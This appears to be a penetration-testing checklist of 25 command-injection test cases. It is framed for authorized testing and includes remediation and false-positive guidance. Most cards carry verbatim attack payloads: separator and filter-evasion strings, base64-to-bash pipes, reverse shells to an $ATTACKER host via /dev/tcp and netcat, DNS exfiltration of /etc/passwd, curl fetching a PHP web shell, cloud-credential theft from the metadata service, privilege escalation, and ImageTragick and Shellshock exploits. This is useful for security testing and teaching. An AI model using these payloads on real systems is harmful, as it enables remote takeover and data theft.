# Command Injection — Checklist

Expert per-attack **test-case matrix** for Command Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*25 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## CMDI-001 — Map every feature that shells out
**Test Category:** Recon &amp; Attack Surface · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** ping/lookup/whois/traceroute, convert/resize/transcode, tar/zip/backup, git clone, diagnostics, import/export/report

**Test Steps:** 1. Enumerate every input that could reach a shell: network tools (ping/nslookup/whois/traceroute), media (convert/resize/ffmpeg), archiving (tar/zip/backup), VCS (git clone), and admin diagnostics/import/export.<br>2. Grep source/JS for sinks: exec/system/spawn/shell_exec/popen/Runtime.exec/ProcessBuilder/subprocess(shell=True).<br>3. Note appliance 'diagnostic'/'ping' endpoints (recurring unauth cmdi).

**Expected Result:** A ranked list of candidate command sinks and the exact parameter that feeds each.

**Payload Example:**

```
features: /api/ping?host= , /convert?file= , /backup?name= , /git/clone?repo= , /admin/diagnostics
```

**Impact:** Missing a shell-out feature means missing the app's most likely RCE.

**Tools:** Burp Suite Pro, source grep, ffuf

**References:** CWE-78; OWASP Testing Guide: Command Injection (WSTG-INPV-12)

---

## CMDI-002 — Second-order &amp; metadata-driven sinks
**Test Category:** Recon &amp; Attack Surface · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Stored hostname/path/name in profile/config; filenames/headers/EXIF/metadata consumed by a backend job/cron

**Test Steps:** 1. Flag stored values (hostname, path, display name, filename) that a backend job/cron later feeds to a shell.<br>2. Test filenames, HTTP headers, and EXIF/metadata that a processor (ImageMagick/ExifTool/ffmpeg) shells out on.<br>3. Plant a blind OOB payload in the stored field and WATCH the callback (fires later, out-of-request).

**Expected Result:** A stored/metadata value triggers a delayed OOB callback when a backend consumes it.

**Payload Example:**

```
profile hostname = x;nslookup $COLLAB ; filename = `id`.jpg ; EXIF Comment = $(curl http://$COLLAB)
```

**Impact:** Second-order cmdi (e.g. GitLab ExifTool CVE-2021-22205) is easily missed and often unauth RCE.

**Tools:** Burp Collaborator, exiftool

**References:** CWE-78; GitLab ExifTool CVE-2021-22205; HackTricks: Command Injection

---

## CMDI-003 — Stand up an OOB host for blind detection
**Test Category:** Recon &amp; Attack Surface · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Any candidate sink where output is not reflected

**Test Steps:** 1. Register an interactsh / Burp Collaborator domain for DNS+HTTP callbacks.<br>2. Use DNS first (escapes most egress filters).<br>3. Keep the correlation id per-payload so each hit ties to one injection point + the target server IP.

**Expected Result:** A working OOB listener ready to catch blind execution and exfil.

**Payload Example:**

```
interactsh-client ; Burp Collaborator ; $COLLAB = <id>.oast.pro
```

**Impact:** Blind cmdi is only provable via OOB or timing; without a listener you cannot confirm.

**Tools:** interactsh-client, Burp Collaborator

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-004 — Inject benign markers &amp; classify channel + OS
**Test Category:** Baseline / Classify · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** One chosen sink at a time

**Test Steps:** 1. Inject a deterministic benign marker and classify the channel: in-band (output), time (delay), or OOB (callback).<br>2. Identify OS/shell: Linux payloads silent does NOT mean safe - try Windows (&amp; ver, &amp; echo %OS%).<br>3. Record what LANDS: full-command vs argument-only vs quoted.

**Expected Result:** The sink is classified as in-band / time / OOB and the OS/shell is known.

**Payload Example:**

```
echo CMDI-7f3a9 ; `expr 7 \* 7` ; &ver ; &echo %OS% ; ;uname
```

**Impact:** Wrong OS/channel assumption is why real cmdi gets missed (Linux payloads look 'safe' on Windows).

**Tools:** Burp Repeater, commix

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-005 — Context breakout — detect the quote/context
**Test Category:** Baseline / Classify · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Sinks where input lands inside quotes or parens

**Test Steps:** 1. Send 127.0.0.1' and 127.0.0.1" SEPARATELY - whichever errors reveals the quote you sit in.<br>2. Pick the matching breakout: unquoted ;id , double ";id;" , single ';id;' , inside `` / $() , or newline %0a.<br>3. Newline (%0a) ignores quoting; if all fail, pivot to argument injection.

**Expected Result:** The exact quoting context is identified and a matching breakout is selected.

**Payload Example:**

```
127.0.0.1'  vs  127.0.0.1"   ->   "; id; "   |   '; id; '   |   %0a id
```

**Impact:** Choosing the right breakout converts a 'filtered' sink into confirmed execution.

**Tools:** Burp Repeater

**References:** CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection)

---

## CMDI-006 — In-band injection (Linux separators)
**Test Category:** Detect — In-band · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Linux/Unix sinks, output reflected

**Test Steps:** 1. Try each separator with id/marker: ;id  |id  ||id  &amp;id  &amp;&amp;id  `id`  $(id)  newline %0a id.<br>2. Look for id/uid=... or the marker in the response.<br>3. If input is one argument, prefix a benign value: 127.0.0.1;id.

**Expected Result:** id/whoami output (uid=...) or the marker appears in the response.

**Payload Example:**

```
;id   |id   `id`   $(id)   127.0.0.1;id   %0aid
```

**Impact:** In-band command execution = confirmed RCE = Critical.

**Tools:** Burp Repeater, commix

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-007 — Windows in-band injection
**Test Category:** Detect — In-band · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Windows/cmd.exe sinks (Linux payloads silent != safe)

**Test Steps:** 1. Try &amp; | || &amp;&amp; with whoami/ver/echo %OS%.<br>2. || is a strong blind test on a bad host (runs on failure).<br>3. Confirm Windows first: &amp; ver , &amp; echo %OS%.

**Expected Result:** whoami/ver/OS output appears, confirming Windows command execution.

**Payload Example:**

```
127.0.0.1 & whoami   127.0.0.1 | whoami   127.0.0.1 || ver   & echo %OS%
```

**Impact:** Windows RCE = Critical; commonly missed because Linux payloads produce no output.

**Tools:** Burp Repeater

**References:** CWE-78; HackTricks: Command Injection

---

## CMDI-008 — Time-based blind injection
**Test Category:** Detect — Blind (time) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sinks with no reflected output

**Test Steps:** 1. Inject a delay: ;sleep 10 (Win &amp; ping -n 10 127.0.0.1 / &amp; timeout /t 10).<br>2. Confirm a REPEATED delay vs a no-payload baseline (2-3x) to exclude jitter.<br>3. Try each separator form: `sleep 10`, $(sleep 10), || sleep 10.

**Expected Result:** The response is reliably delayed by ~10s only when the payload is present.

**Payload Example:**

```
;sleep 10   `sleep 10`   $(sleep 10)   & ping -n 10 127.0.0.1   & timeout /t 10
```

**Impact:** Reliable blind delay = blind RCE = Critical (then add OOB/exfil).

**Tools:** Burp Repeater, commix --technique=T

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-009 — Out-of-band (OOB) detection
**Test Category:** Detect — Blind (OOB) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Blind sinks with egress; DNS preferred

**Test Steps:** 1. Trigger a callback: ;nslookup CMDI.$COLLAB / ;curl http://$COLLAB/CMDI (Win &amp; nslookup CMDI.$COLLAB).<br>2. Confirm the hit comes FROM THE TARGET server IP and carries your unique id.<br>3. DNS works even when HTTP egress is blocked.

**Expected Result:** A DNS/HTTP callback arrives at your listener from the target server, carrying your marker.

**Payload Example:**

```
;nslookup CMDI.$COLLAB   ;curl http://$COLLAB/CMDI   & nslookup CMDI.$COLLAB
```

**Impact:** Server-sourced OOB carrying your marker = blind RCE = Critical.

**Tools:** interactsh-client, Burp Collaborator

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-010 — Boolean / response-difference blind (no time, no OOB)
**Test Category:** Detect — Blind (boolean) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Blind sinks where timing is noisy AND OOB egress is blocked

**Test Steps:** 1. Find a success-vs-fail response diff: ;true vs ;false ; `id` vs `idXXXX`.<br>2. Use a marker branch: ;[ -f /etc/passwd ] &amp;&amp; echo CMDI_OK.<br>3. Read data 1 char/req via oracle: ;[ "$(whoami|cut -c1)" = r ] &amp;&amp; &lt;observable&gt;.

**Expected Result:** A stable success-vs-failure signal proves execution and enables char-by-char exfil.

**Payload Example:**

```
;true vs ;false   ;[ $(id -u) -eq 0 ] && <true-branch>   ;[ "$(whoami|cut -c1)"=r ] && <obs>
```

**Impact:** Boolean oracle proves blind RCE and exfiltrates data with no timing/OOB channel.

**Tools:** Burp Repeater/Intruder

**References:** CWE-78; HackTricks: Command Injection

---

## CMDI-011 — Space-filter bypass
**Test Category:** Evade — WAF/Filter · **Severity:** High · **CVSS:** 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

**Where to Test / Injection Point:** Sinks that block or strip spaces

**Test Steps:** 1. Linux: ${IFS} , $IFS$9 , {cmd,arg} brace expansion, &lt; redirection, tab via X=$'\t'.<br>2. Windows: %09 (tab), commas.<br>3. Combine with keyword tricks.

**Expected Result:** The command executes despite space filtering.

**Payload Example:**

```
cat${IFS}/etc/passwd   {cat,/etc/passwd}   cat</etc/passwd   cat$IFS$9/etc/passwd
```

**Impact:** Restores execution when naive space blacklists are in place.

**Tools:** Burp, poc/evasion.py

**References:** CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection)

---

## CMDI-012 — Keyword / command-name filter bypass
**Test Category:** Evade — WAF/Filter · **Severity:** High · **CVSS:** 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

**Where to Test / Injection Point:** Sinks that blacklist command names (cat, whoami, etc.)

**Test Steps:** 1. Quote/escape splitting: c''at , c\at , "c"at , w'h'o'a'm'i , w\ho\am\i.<br>2. Globbing: /???/c?t /etc/passwd , /bin/c?t.<br>3. Var/case tricks: ${IFS%??} , $(tr A-Z a-z&lt;&lt;&lt;WHOAMI).

**Expected Result:** The blacklisted command runs after obfuscation.

**Payload Example:**

```
c''at /etc/passwd   w\ho\am\i   /???/c?t /etc/passwd   who$@ami
```

**Impact:** Defeats command-name blacklists - a very common partial fix.

**Tools:** Burp, poc/evasion.py

**References:** CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection)

---

## CMDI-013 — Encoded / base64-decode-pipe bypass
**Test Category:** Evade — WAF/Filter · **Severity:** High · **CVSS:** 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

**Where to Test / Injection Point:** Heavily filtered sinks

**Test Steps:** 1. Linux: echo &lt;b64&gt;|base64 -d|bash ; printf '\167..'|sh ; bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;..).<br>2. Windows: powershell -enc &lt;base64-UTF16LE&gt; (bypasses quote/space filters).<br>3. Encode the whole command to sidestep token blacklists.

**Expected Result:** The decoded command executes, bypassing the content filter.

**Payload Example:**

```
echo d2hvYW1p|base64 -d|bash   powershell -enc <UTF16LE-b64>
```

**Impact:** Encoding hides the entire payload from signature-based WAFs.

**Tools:** Burp, CyberChef

**References:** CWE-78; HackTricks: Command Injection

---

## CMDI-014 — Windows evasion — env-substring / DOSfuscation
**Test Category:** Evade — WAF/Filter · **Severity:** High · **CVSS:** 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

**Where to Test / Injection Point:** Windows sinks with keyword/space filters

**Test Steps:** 1. Rebuild a blocked word from env substrings: %COMSPEC:~-7,3% ; set s=who&amp;&amp;set t=ami&amp;&amp;cmd /v:on /c echo !s!!t!.<br>2. Escape/split: w^h^o^a^m^i , who""ami , "wh"o"am"i.<br>3. FOR /F: for /f %i in ('whoami') do @echo %i.

**Expected Result:** The blocked Windows command runs after DOSfuscation.

**Payload Example:**

```
w^h^o^a^m^i   who""ami   %COMSPEC:~-7,3%   for /f %i in ('whoami') do @echo %i
```

**Impact:** Defeats Windows keyword filters that Linux-focused rules miss.

**Tools:** Burp

**References:** CWE-78; HackTricks: Command Injection

---

## CMDI-015 — Separator swap when one is filtered
**Test Category:** Evade — WAF/Filter · **Severity:** High · **CVSS:** 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

**Where to Test / Injection Point:** Sinks blocking a specific separator

**Test Steps:** 1. If ; blocked, swap: | , || , &amp;&amp; , %0a (newline), `cmd` , $(cmd) , $IFS.<br>2. Newline (%0a / \n) frequently survives when metachars are stripped.<br>3. Re-test each after any partial fix.

**Expected Result:** Execution succeeds via an unfiltered separator.

**Payload Example:**

```
%0aid   |id   $(id)   `id`   ||id
```

**Impact:** A single-separator blacklist is trivially bypassed; proves the fix is incomplete.

**Tools:** Burp

**References:** CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection)

---

## CMDI-016 — Argument / option injection (value is one argv item)
**Test Category:** Argument Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sinks where input becomes ONE argument to a known tool (no separators needed)

**Test Steps:** 1. Identify the tool (curl/tar/git/wget/zip/rsync/ssh) and inject its dangerous flags.<br>2. curl -o /var/www/html/sh.php http://$ATTACKER/sh.php (write-&gt;RCE) ; --upload-file /etc/passwd (exfil).<br>3. tar --checkpoint-action=exec=sh\ shell.sh ; git clone ext::sh -c id ; ssh -o ProxyCommand='sh -c id'.

**Expected Result:** A tool flag causes file write, command exec, or exfil even though separators are filtered.

**Payload Example:**

```
curl -o /var/www/html/sh.php http://$ATTACKER/sh.php
tar --checkpoint=1 --checkpoint-action=exec=sh\ -c\ id
git clone ext::sh -c 'id' x
```

**Impact:** Argument injection -&gt; file write/RCE = Critical; -&gt; SSRF/read only = High. Bypasses separator filters entirely.

**Tools:** Burp, git/tar/curl

**References:** CWE-88; CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection)

---

## CMDI-017 — Interactive shell / reverse shell (authorized)
**Test Category:** Impact — Shell · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed exec; authorized red-team engagements only

**Test Steps:** 1. Bug bounty: a benign marker (id/whoami/hostname) is sufficient proof - STOP there.<br>2. Authorized red-team only: reverse shell to your listener.<br>3. Linux: bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1 ; Windows: PowerShell TCP client. Catch with nc -lvnp 4444.

**Expected Result:** A shell connects back (authorized) or id/whoami confirms interactive execution.

**Payload Example:**

```
bash -i >& /dev/tcp/$ATTACKER/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $ATTACKER 4444 >/tmp/f
```

**Impact:** Full interactive control of the server - Critical RCE.

**Tools:** netcat, poc/revshell.py

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-018 — Blind exfil of command output via OOB
**Test Category:** Impact — Exfil · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed blind exec with an OOB channel

**Test Steps:** 1. Wrap output in the callback: ;nslookup $(whoami).$COLLAB ; ;curl http://$COLLAB/$(id|base64).<br>2. Chunk for DNS label limits: for c in $(cat /etc/passwd|base64|tr -d '='|fold -w60); do nslookup $c.$COLLAB; done.<br>3. Windows: &amp; nslookup %COMPUTERNAME%.$COLLAB.

**Expected Result:** Command output (whoami/hostname/file contents) arrives at your OOB listener.

**Payload Example:**

```
;nslookup $(whoami).$COLLAB   ;curl http://$COLLAB/$(id|base64)   & nslookup %COMPUTERNAME%.$COLLAB
```

**Impact:** Proves data exfiltration from a blind sink - demonstrates concrete impact to the client.

**Tools:** interactsh-client, Burp Collaborator

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-019 — Post-exploitation read: config/.env/cloud creds
**Test Category:** Impact — Pivot · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed exec (authorized); read-only

**Test Steps:** 1. Read app secrets: cat .env / config -&gt; DB creds, API keys (read-only).<br>2. Cloud metadata from the box: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -&gt; IAM creds.<br>3. Validate creds prove access, then STOP - no lateral movement without scope.

**Expected Result:** Config secrets or cloud IAM credentials are read from the compromised host.

**Payload Example:**

```
cat /var/www/.env ; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** Turns RCE into cloud-account/database compromise - maximum client impact.

**Tools:** curl, SSRFmap

**References:** CWE-78; CWE-918; HackTricks: Command Injection

---

## CMDI-020 — GTFOBins privilege escalation from limited exec
**Test Category:** Impact — Privesc · **Severity:** High · **CVSS:** 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed exec as a low-priv user (authorized)

**Test Steps:** 1. If exec is via a 'limited' binary, escape to a full shell: awk 'BEGIN{system("/bin/sh")}' , find . -exec /bin/sh \; , vi -c ':!sh'.<br>2. Enumerate privesc: sudo -l ; getcap -r / ; find / -perm -4000.<br>3. Match the binary on gtfobins.github.io.

**Expected Result:** A limited binary yields a full shell or a SUID/sudo path to root.

**Payload Example:**

```
awk 'BEGIN{system("/bin/sh")}'   find . -exec /bin/sh \;   sudo -l   find / -perm -4000
```

**Impact:** Escalates limited exec to full/root control - deepens impact.

**Tools:** GTFOBins, LinPEAS

**References:** CWE-78; GTFOBins (gtfobins.github.io)

---

## CMDI-021 — Special sink — ImageMagick delegate (ImageTragick)
**Test Category:** Impact — Special Sinks · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Image-processing features (upload/convert/resize) using ImageMagick

**Test Steps:** 1. Upload a crafted MVG/SVG whose delegate shells out: push graphic-context; image over 0,0 0,0 'https://x"|id "&gt;'; pop graphic-context.<br>2. Cross-ref the FileUpload kit to land the file.<br>3. Confirm via OOB/output.

**Expected Result:** Processing the crafted image executes your command (ImageTragick).

**Payload Example:**

```
MVG: image over 0,0 0,0 'https://x"|curl http://$COLLAB ">'
```

**Impact:** Unauth RCE via image upload (CVE-2016-3714) - Critical.

**Tools:** ImageMagick, Burp

**References:** CWE-78; ImageTragick CVE-2016-3714; HackTricks: Command Injection

---

## CMDI-022 — Special sink — ffmpeg / Ghostscript / git hook
**Test Category:** Impact — Special Sinks · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media transcoding (ffmpeg), PDF/EPS rendering (Ghostscript), git clone/checkout

**Test Steps:** 1. ffmpeg: crafted .m3u8 referencing file:///etc/passwd or http://169.254.169.254 (read/SSRF).<br>2. Ghostscript -dSAFER bypass via crafted .eps/.pdf (%pipe%id) -&gt; RCE (CVE-2018-16509 / CVE-2023-36664).<br>3. git: clone ext::sh -c 'id' or a repo with a malicious post-checkout hook.

**Expected Result:** The processor executes your command or reads local files/SSRF.

**Payload Example:**

```
m3u8 -> file:///etc/passwd ; EPS -> (%pipe%id) ; git clone ext::sh -c 'id'
```

**Impact:** RCE/file-read via trusted media/VCS processors - Critical.

**Tools:** ffmpeg, Ghostscript, git

**References:** CWE-78; Ghostscript CVE-2023-36664; HackTricks: Command Injection

---

## CMDI-023 — Shellshock (env-var -&gt; bash function trailer RCE)
**Test Category:** Impact — Known CVE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Legacy CGI reachable via headers (User-Agent/Cookie/Referer)

**Test Steps:** 1. Target CGI that exports request data into bash env.<br>2. Inject: () { :;}; echo; /bin/id in User-Agent/Cookie.<br>3. Confirm output/OOB. Still found on legacy appliances.

**Expected Result:** The bash function-trailer executes your command via a CGI env var.

**Payload Example:**

```
User-Agent: () { :;}; echo; /usr/bin/id
```

**Impact:** Unauth RCE on legacy CGI (CVE-2014-6271) - Critical.

**Tools:** Burp, nmap http-shellshock

**References:** CWE-78; Shellshock CVE-2014-6271; HackTricks: Command Injection

---

## CMDI-024 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: a ;/| merely reflected (no command ran); a single slow response after ;sleep (jitter - re-test); an 'invalid host' error (validation); an OOB hit you cannot tie to your payload+target IP; SSRF mislabeled as cmdi; 'commix flagged it' with no manual repro; self-DoS.<br>2. REQUIRE: execution proof = output / repeated delay / server-sourced OOB carrying your marker.<br>3. Re-test timing 2-3x; use a benign marker.

**Expected Result:** Only candidates with genuine execution proof survive.

**Payload Example:**

```
reflected ; = NOT a finding ; single slow response = re-test ; commix-only = reproduce first
```

**Impact:** Protects report credibility; cmdi is dense with reflection/jitter false positives.

**Tools:** manual, Burp

**References:** CWE-78; PortSwigger Web Security Academy: OS command injection

---

## CMDI-025 — Client-facing impact &amp; PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact: RCE = Critical (in-band/blind/OOB all equal).<br>2. Provide the exact request, the benign marker output (id/whoami) or the correlated OOB hit + timing runs, and the affected parameter/OS.<br>3. Set CVSS 3.1 + CWE-78 (CWE-88 for argument injection). Remediation: avoid shelling out - use library/native APIs; if unavoidable, no shell interpolation, use execFile/argv arrays with a strict allowlist, and never pass user input as arguments.<br>4. Benign marker only, removed any written files, killed shells, no persistence; de-dupe to one finding per sink.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: request + id/whoami output (or OOB hit + 2-3 timing runs) + CVSS + CWE-78/88 + remediation.
```

**Impact:** Converts execution proof into a defensible Critical report at the correct severity.

**Tools:** CVSS calculator, COMMAND_INJECTION_REPORT_TEMPLATE.md

**References:** CWE-78; CWE-88; FIRST CVSS v3.1; OWASP Testing Guide: Command Injection (WSTG-INPV-12)  |  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; GTFOBins; OWASP; Hacker Recipes

---
